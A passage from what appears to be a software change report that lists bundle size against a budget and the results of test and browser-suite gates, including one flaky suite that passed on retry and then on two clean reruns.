  screens beyond the entry: 891,828 bytes (budget 900,000; main 890,629).
- Gate on the final code: `npm run check` passed (`audit:ai` 542/542,
  `audit:ai-eval` passed with no fixture change). `npm run check:browser`
  passed all 13 suites on the first attempt with no retries. In an earlier
  gate run, before the offer fix, `workflow` passed only on its retry. Its
  first attempt timed out waiting for the Reader after a Library search, a
  path this branch does not touch. Two standalone reruns with retries off
  both passed.
